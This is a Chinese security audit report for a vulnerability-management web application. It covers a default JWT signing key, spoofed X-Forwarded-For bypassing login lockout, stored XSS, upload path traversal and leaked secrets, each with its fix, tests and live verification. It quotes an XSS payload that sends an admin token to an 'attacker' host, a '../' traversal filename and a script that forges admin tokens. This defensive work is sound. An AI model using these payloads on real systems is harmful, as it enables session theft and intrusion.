# 安全审计与加固报告（t188，2026-11）

> 审计对象：`dayutech/Vuln-Audit-Lifecycle-Management`，基线 `d58b40f`（191 提交，19 条需求已交付）。
> 审计方式：源码静态审计（鉴权面全量扫描 + 危险 API 模式检索）+ **线上实测验证**（`http://192.168.188.226:8089`，2026-11-18）。
> 结论：发现 **1 项致命（已在线上复现）**、**2 项高危**、**4 项中危**、**1 项低危**，全部已修复并回归；
> 依赖漏洞由 8 项（5 high）降到 2 项（1 moderate，需破坏性升级，暂缓）。

## 1. 结论汇总

| ID | 等级 | 问题 | 影响 | 状态 |
|---|---|---|---|---|
| S1 | **致命** | JWT 签名密钥使用仓库内公开默认值 | 任何人可离线伪造 `admin` token 直接登录（已线上复现 200） | ✅ 已修复 |
| S2 | 高危 | 无条件采信 `X-Forwarded-For` + 后端监听 `0.0.0.0:8088` | 登录锁定/验证码限流可被伪造 IP 绕过（等价无限次爆破） | ✅ 已修复 |
| S3 | 高危 | 富文本「含标签即原样渲染」→ 存储型 XSS | 普通用户可在知识库/文档/任务记录中植入脚本，窃取管理员 `localStorage` 中的 JWT | ✅ 已修复 |
| S4 | 中高危 | 上传文件名未清洗就拼进落盘路径 | 路径穿越（CWE-22）→ 任意路径写入 | ✅ 已修复 |
| S5 | 中危 | `User.totpSecret`（TOTP 密文）随实体序列化 | 管理员/组长可批量获取全员 TOTP 密文 | ✅ 已修复 |
| S6 | 中危 | 生产日志默认 `DEBUG` + `show-sql: true` | 全量 SQL 与绑定参数（口令散列、TOTP 密文）写入日志文件 | ✅ 已修复 |
| S7 | 中危 | 数据库口令以默认值硬编码在仓库里 | 漏配环境变量时静默使用公开口令 | ✅ 已修复 |
| S8 | 低危 | 仓库 nginx 配置用 `$proxy_add_x_forwarded_for`、缺安全响应头 | 仓库文件与线上不一致；无 `nosniff` / `X-Frame-Options` / `Referrer-Policy` | ✅ 已修复 |
| S9 | 中危 | 前端依赖漏洞 8 项（axios 等 5 high） | 原型污染/SSRF/开放重定向等（多数需 Node 侧适配器才可触发） | ⚠️ 部分修复（见 §4） |
| S10 | 低危 | 未知 API 路径返回 500（而非 404）+ ERROR 堆栈 | 客户端无法区分「路径不存在」与「服务故障」；探测流量可刷爆错误日志 | ✅ 已修复 |

## 2. 致命：JWT 默认密钥（S1）

**现象**：`backend/src/main/resources/application.yml` 写的
`jwt.secret: ${JWT_SECRET:your-256-bit-secret-key-here-please-change-in-production}`。
线上 `~/apps/vuln-audit/deploy/backend.env` **没有 `JWT_SECRET`**，于是应用用这个**公开在 GitHub 上的字符串**签名。

**线上复现**（用默认值自签 `sub=admin, roles=ROLE_ADMIN`，`alg=HS384`）：

```
GET http://192.168.188.226:8089/api/v1/users/me/permissions   Authorization: Bearer <自签 token>
→ HTTP 200  {"success":true,"data":{"userId":"baf4091e-…","username":"admin",
             "permissions":["approval:review", …]}}
```

即：**不需要任何口令即可拿到管理员身份**（8088 直连同样 200）。

**修复**：
1. `security/JwtSecretGuard`：启动时校验密钥——空值、仓库占位符（含 `your-` 前缀）、长度 < 32、字符种类过少，一律
   抛 `IllegalStateException`，**应用起不来**而不是带着公开密钥对外服务。在 `JwtUtils#init` 里调用。
2. 线上 `backend.env` 增加随机 `JWT_SECRET`（`openssl rand -base64 48`），重启生效。
3. 测试：`JwtSecretGuardTest`（6 例，含「仓库默认值必须被拒绝」）。

**副作用（需知悉）**：更换密钥后所有存量 token 立即失效，**所有用户需要重新登录一次**。

## 3. 高危

### 3.1 X-Forwarded-For 伪造绕过登录锁定（S2）

**现象**：5 个 controller（`AuthController`、`AuthUnlockController`、`AuthSsoController`、
`AuthRegistrationController`、`AuthPasswordResetController`）各自复制了同一段取 IP 逻辑：

```java
String forwarded = request.getHeader("X-Forwarded-For");
if (forwarded != null && !forwarded.isBlank()) return forwarded.split(",")[0].trim();
return request.getRemoteAddr();
```

它**无条件**采信客户端可完全控制的头。而线上后端监听 `*:8088`（`ss -lntp` 实测），
局域网可绕过 nginx 直连。

**线上复现**（直连 8088，错误口令 + 伪造头）：

| 尝试 | `X-Forwarded-For` | 结果 |
|---|---|---|
| 1–5 | `203.0.113.12`（固定） | 401 ×5，第 6 次 429（锁定生效） |
| 6 | `203.0.113.13`（**换一个**） | **401** —— 锁定被绕过 |
| 7 | 不带转发头（真实 IP） | 429（真实 IP 仍处锁定期） |

即攻击者每次尝试换一个伪造 IP，可以无限次在线爆破；同机 `login-lockout` 的告警/账户升级逻辑也随之中毒。
（经 nginx 8089 时因线上配置已固定 `X-Forwarded-For $remote_addr`，该路径未被利用。）

**修复**：
1. 新增 `security/ClientIpResolver`（单一事实来源）：
   - **只有直连对端是受信代理**（`app.security.trusted-proxies`，默认仅回环）时才读转发头；
   - 取转发头的**最后一段**（最近一跳代理写入的值，兼容「追加」与「覆盖」两种 nginx 写法）；
   - 结果必须是合法 IP 字面量，否则回退 `X-Real-IP` → 对端地址。
2. 5 个 controller 全部改为委托该组件（删除重复实现）。
3. `server.address` 默认 `127.0.0.1`（`SERVER_ADDRESS` 可覆盖），把「绕过 nginx 直连」从根上关掉。
4. 测试：`ClientIpResolverTest`（8 例）、`LoginLockoutIpSpoofingTest`（2 例，断言「换伪造 IP 仍 429」）。

### 3.2 富文本存储型 XSS（S3）

**现象**：`frontend/src/pages/knowledge/richContent.ts` 的 `renderRichContent` 在
`containsHtmlTag(content)` 为真时**原样返回**，随后被 6 处
`dangerouslySetInnerHTML` 注入（知识库详情/编辑预览、规范文档详情/编辑预览、任务阶段记录、任务文档预览）。
正文由普通用户可写，而 JWT 存在 `localStorage.access_token`，因此一条
`<img src=x onerror="fetch('//attacker/?'+localStorage.access_token)">`
即可在管理员打开页面时完成**管理员会话窃取**（`pages/tasks/index.tsx` 里还有一份复制实现，同样存在）。

**修复**：
1. 引入 `dompurify`，`renderRichContent` 的两个分支（HTML / Markdown）都过 `sanitizeRichHtml`：
   标签白名单（p/br/strong/em/ul/ol/li/pre/code/table/a/img/h1-h6…）、属性白名单（不含任何 `on*`）、
   `FORBID_TAGS` 显式排除 `script/iframe/object/embed/style/svg/math/form/input/button`，
   `afterSanitizeAttributes` 钩子：`<a>` 强制 `target=_blank rel="noopener noreferrer"`，
   并剔除含 `url(`/`expression(`/`javascript:` 的 `style`（DOMPurify 不解析 CSS 值）。
2. 删除 `pages/tasks/index.tsx` 里的复制实现，统一 import 共享模块（避免再次漂移）。
3. 验证（headless Edge + 真实 DOMPurify 构建产物）：`<img onerror>` → `onerror` 被移除；
   `<script>` 整体移除；`javascript:` 链接 href 被删；`<svg onload>`/`<iframe>` 移除；
   `style="background:url(javascript:…)"` 整个 style 被删；正常富文本（粗体/列表/代码块/外链/data:image）保留。

## 4. 中危与低危

### 4.1 上传文件名路径穿越（S4）

`AssetFileController#resolveUploadFileName`、`AssetDeliverableController#resolveUploadFileName`
直接把 `file.getOriginalFilename()` 拼成 `UUID + "_" + 原名` 后 `resolve` 落盘；
`VulnerabilityController#uploadVulnerabilityAttachment` 同样为
`System.currentTimeMillis() + "_" + getOriginalFilename()`。客户端提交
`filename="a/../../../../x.sh"` 时 `..` 段规范化后逃出上传目录 → 任意路径写入
（覆盖配置/写 cron/覆盖 jar）。对照：`ToolServiceImpl`、`DocumentAttachmentServiceImpl`、
`UploadApprovalServiceImpl` 早已有 `sanitizeFileName`——三处漏了。

**修复**：新增 `util/FileNameSanitizer`（只留最后一段 → 去控制字符 → 去 Windows 保留字符 →
去前导点 → 去 `..` → 截断 180 字符 → 空则回退），三处统一调用；落盘仍保留 UUID 前缀防同名覆盖。
**测试**：`FileNameSanitizerTest`（9 例）+ `UploadFilenameTraversalTest`（真实 multipart 上传，
断言落库路径规范化后仍在上传根目录内且不含 `..`）。

### 4.2 TOTP 密钥密文随实体序列化（S5）

`User.totpSecret` 缺 `@JsonIgnore`，而 `GET /users`、`GET /users/{id}`、`PUT /users/{id}`
直接返回实体 → `ADMIN`/`PROJECT_LEADER` 可批量拉取全员 TOTP 密文（AES-GCM，但密钥一旦泄漏即全部失效）。
**修复**：加 `@JsonIgnore`；**测试**：`UserSerializationTest`（断言 `totpSecret`/`passwordHash`
及其值都不出现在 JSON 中，`username` 等正常字段保留）。

### 4.3 生产日志级别（S6）

`application.yml` 默认 `com.vulnaudit: DEBUG`、`org.springframework.security: DEBUG`、
`org.hibernate.SQL: DEBUG`、`BasicBinder: TRACE`、`spring.jpa.show-sql: true`
→ 每条 SQL 与**全部绑定参数**（口令散列、TOTP 密文、token 片段）落进 `backend.log`。
**修复**：默认 `INFO`/`WARN`、`show-sql=false`，需要排查时用 `LOG_LEVEL_*` / `JPA_SHOW_SQL` 临时打开。

### 4.4 数据库口令默认值（S7）

`spring.datasource.password: ${DB_PASSWORD:fC9qCCCA…}` —— 一个真实口令被写进公开仓库。
**修复**：去掉默认值（`${DB_PASSWORD}`），未配置则启动失败（不给「静默使用公开口令」的机会）。

### 4.5 nginx 配置与安全响应头（S8）

仓库 `deploy/nginx-vuln-audit.conf` 仍是 `$proxy_add_x_forwarded_for`（线上已是 `$remote_addr`），
且无安全响应头。**修复**：改为 `$remote_addr` 并加注释说明；新增
`deploy/nginx-security-headers.conf`（`nosniff` / `X-Frame-Options: SAMEORIGIN` /
`Referrer-Policy: no-referrer` / `X-XSS-Protection: 0`），在 server 与各 `add_header` location 内 include
（nginx 的 `add_header` 是「全有或全无」继承，location 内必须重复引入）。

### 4.6 依赖漏洞（S9）

`npm audit --omit=dev`：审计前 **8 项**（5 high：axios 多条原型污染/SSRF、react-router 多条、
lodash 代码注入、form-data CRLF；3 moderate：follow-redirects、quill、react-quill）。
执行 `npm audit fix`（非破坏性）后：**2 项**（quill/react-quill，moderate）。
实际落点：axios 1.14.0 → **1.21.1**，react-router-dom 7.13.2 → **7.18.5**，
lodash 4.18.1、form-data 4.0.6、follow-redirects 1.16.3。
**未修**：`react-quill` 仍依赖 `quill@1.3.7`（GHSA-4943-9vgg-gr5r），修它需要把 react-quill 降到 0.0.2
（破坏性），故保留并在 §5 记录；渲染侧已被 DOMPurify 兜住。

## 5. 未修复项与建议（后续）

1. **无全局 API 限流**：仅登录/发码/找回密码有节流；其余接口无速率限制（建议网关层或 Bucket4j）。
2. **无 CSP**：`unsafe-inline` 依赖（antd 内联样式）使 CSP 需专门调试；当前用 DOMPurify 兜住渲染侧。
   建议后续以「CSP Report-Only」起步。
3. **`react-quill@2` 仍依赖 quill 1.3.7 的 XSS 告警**：需评估迁移到 quill 2 或换编辑器。
4. **JWT 放在 `localStorage`**：XSS 一旦成功即可窃取；更稳的方案是 HttpOnly Cookie + SameSite，
   但会牵动前后端与 CSRF 设计，属较大改造。
5. **`/actuator/health` 匿名可访问**：仅健康状态，无敏感信息；如需收敛可改为鉴权。
6. **后端依赖未做 CVE 扫描**：建议接入 OWASP dependency-check 或 `mvn versions:display-dependency-updates`。

## 6. 已确认的「没有问题」项（避免重复审计）

- `UserDirectoryEntry` 只暴露 `id/username/fullName`（专用 record，从类型上杜绝字段泄漏）。
- `User.passwordHash` 已有 `@JsonIgnore`。
- remember-me cookie：`HttpOnly` + `Secure` + `SameSite=Lax` + `Path=/`，且服务端轮换 + 重放检测。
- SSO：`state` 一次性消费（`SsoStateStore#consume`），回调有 provider 校验。
- 口令：BCrypt；`PasswordPolicy`（≥8 位 + 四类字符至少三类）。
- 原生 SQL：全部使用命名参数（`@Query` + `:param` / `nativeQuery`），未见字符串拼接注入面。
- 软删除/可见性：`@SQLRestriction` 与 `AccessGuard` 仍是单一来源，新增端点沿用数据级守卫。
- 上传审批临时区：`UploadApprovalServiceImpl` 已用 `Paths.get(key).getFileName()` + `sanitizeFileName` 防穿越。
- 表单三层取值、导出复用 `FormValues.effectiveValue` 等业务语义未被本次改动触碰。

## 7. 复核命令

```bash
# 1) 新增安全用例（约 75 秒）
cd backend && mvn -B test -Dtest=ClientIpResolverTest,JwtSecretGuardTest,FileNameSanitizerTest,UploadFilenameTraversalTest,LoginLockoutIpSpoofingTest,UserSerializationTest,UnknownApiPathTest

# 2) 全量回归（约 18 分钟）
cd backend && mvn -B clean test          # 期望 Tests run: 1164, Failures 0, Errors 0, Skipped 0

# 3) 线上：伪造默认密钥的 token 必须 401（修复前是 200）
TOKEN=$(python scripts/qa/forge_default_jwt.py)   # 见该脚本说明
curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $TOKEN" \
     http://192.168.188.226:8089/api/v1/users/me/permissions

# 4) 线上：直连 8088 应连接失败（后端已绑回环）
curl -s -o /dev/null -w '%{http_code}\n' --max-time 5 http://192.168.188.226:8088/api/v1/auth/login-theme

# 5) 前端依赖
cd frontend && npm audit --omit=dev
```

## 8. 变更清单

| 文件 | 变更 |
|---|---|
| `backend/.../security/JwtSecretGuard.java` | 新增：密钥合规校验（启动 fail-fast） |
| `backend/.../security/ClientIpResolver.java` | 新增：受信代理感知的客户端 IP 解析 |
| `backend/.../util/FileNameSanitizer.java` | 新增：上传文件名清洗 |
| `backend/.../security/JwtUtils.java` | 初始化时校验密钥 |
| `backend/.../controller/Auth*.java`（5 个） | 委托 `ClientIpResolver`，删除重复实现 |
| `backend/.../controller/AssetFileController.java`、`AssetDeliverableController.java`、`VulnerabilityController.java` | 上传文件名清洗 |
| `backend/.../entity/User.java` | `totpSecret` 加 `@JsonIgnore` |
| `backend/.../exception/GlobalExceptionHandler.java` | `NoResourceFoundException` → 404（原为 500） |
| `backend/src/main/resources/application.yml` | 绑回环、日志级别、show-sql、DB 口令默认值、`app.security.trusted-proxies` |
| `frontend/src/pages/knowledge/richContent.ts` | DOMPurify 白名单清洗 + 外链/样式钩子 |
| `frontend/src/pages/tasks/index.tsx` | 删除复制实现，改用共享渲染 |
| `frontend/package.json`、`package-lock.json` | 新增 `dompurify`；axios/react-router/lodash 等升级 |
| `deploy/nginx-vuln-audit.conf`、`deploy/nginx-security-headers.conf` | XFF 固定 `$remote_addr`、安全响应头 |
| `backend/src/test/...`（7 个新测试类） | 30 例回归 |
| `docs/security-audit-2026-11.md` | 本报告 |
| `deploy/README.md` §74 | 部署侧配置说明（必配项与轮换影响） |
### 4.7 未知路径 500 而非 404（S10）

**现象**：Spring 6.2 起，未匹配 Controller 的请求落到静态资源处理器并抛 `NoResourceFoundException`
（不继承 `NoHandlerFoundException`），被兜底 `@ExceptionHandler(Exception.class)` 当成系统异常：
线上实测 `GET /api/v1/forms/templates`（拼错路径）→ **500 + ERROR 堆栈**。

**修复**：`GlobalExceptionHandler` 显式处理 `NoResourceFoundException` → 404 + 统一响应体。
**测试**：`UnknownApiPathTest`（3 例：GET/POST 未知路径 404、未认证 404 路径仍 401）。

## 附录：修复后的线上证据（2026-11-18 23:2x，部署于 192.168.188.226）

```
# ① 默认密钥自签 token 被拒（修复前 200 + admin 权限清单）
$ python scripts/qa/forge_default_jwt.py --check http://192.168.188.226:8089
CHECK http://192.168.188.226:8089/api/v1/users/me/permissions -> HTTP 401

# ② 后端直连已关闭（修复前 8088 可从局域网直接访问）
192.168.188.226:8088 -> 连接被拒绝
ss -lntp | grep 8088  →  LISTEN [::ffff:127.0.0.1]:8088

# ③ 轮换伪造 XFF 不再绕过锁定（修复前第 6 次是 401）
第1..5次 (X-Forwarded-For: 10.77.77.1..5) -> 401
第6次   (X-Forwarded-For: 10.77.77.6)     -> 429
后端日志同时记录真实对端 IP（伪造值被彻底忽略）：
  LoginLockoutServiceImpl: IP 登录失败次数达到阈值，已锁定该 IP: ip=192.168.188.210, minutes=15
  AuthController:          登录被 IP 级锁定: ip=192.168.188.210, retryAfter=900s

# ④ 未知路径 404（修复前 500 + ERROR 堆栈）
GET /api/v1/forms/templates        -> 404
GET /api/v1/definitely-not-real    -> 404

# ⑤ 安全响应头
curl -sI http://192.168.188.226:8089/ | grep -Ei 'x-content-type|x-frame|referrer-policy'
  X-Content-Type-Options: nosniff
  X-Frame-Options: SAMEORIGIN
  Referrer-Policy: no-referrer
  X-XSS-Protection: 0

# ⑥ 前端（升级 react-router 7.18.5 / axios 1.21.1 后）可正常渲染
headless Edge dump-dom：/、/assets、/knowledge 均渲染出登录页（login-page 节点存在，无 JS 异常）
```

> 部署影响：`JWT_SECRET` 轮换后存量 token 全部失效，**所有用户需重新登录一次**。
